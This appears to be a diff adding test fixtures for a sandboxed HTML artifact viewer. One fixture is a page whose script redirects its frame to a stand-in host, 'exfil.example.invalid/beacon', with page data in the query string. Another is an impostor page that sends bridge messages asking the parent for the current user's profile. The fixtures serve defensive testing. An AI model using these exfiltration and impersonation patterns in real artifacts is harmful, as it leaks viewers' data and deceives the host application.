@@ -268,3 +268,37 @@ export const SPRINT_DASHBOARD_HTML = `<!doctype html>
 </body>
 </html>
 `;
+
+export const SELF_NAVIGATING_FILE_NAME = 'self-navigating.html';
+export const SELF_NAVIGATION_TARGET = 'https://exfil.example.invalid/beacon';
+
+/**
+ * An artifact that renders, then navigates its own frame to an external URL
+ * (a beacon carrying data in the query string).
+ */
+export const SELF_NAVIGATING_HTML = `<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Navigator</title></head>
+<body>
+<h1>Navigating artifact</h1>
+<script>
+  window.addEventListener('load', function () {
+    setTimeout(function () {
+      location.href = '${SELF_NAVIGATION_TARGET}?d=' + encodeURIComponent(document.title);
+    }, 500);
+  });
+</script>
+</body>
+</html>
+`;
+
+/**
+ * The page served in place of the external target: it impersonates the
+ * artifact by speaking the bridge protocol and asking for the viewer's profile.
+ */
+export const SELF_NAVIGATION_IMPOSTOR_HTML = `<!doctype html>
+<html><body><p>impostor</p><script>
+  parent.postMessage({mmArtifact: 1, type: 'ready'}, '*');
+  parent.postMessage({mmArtifact: 1, type: 'request', id: 'x1', method: 'getCurrentUser'}, '*');
+</script></body></html>
+`;
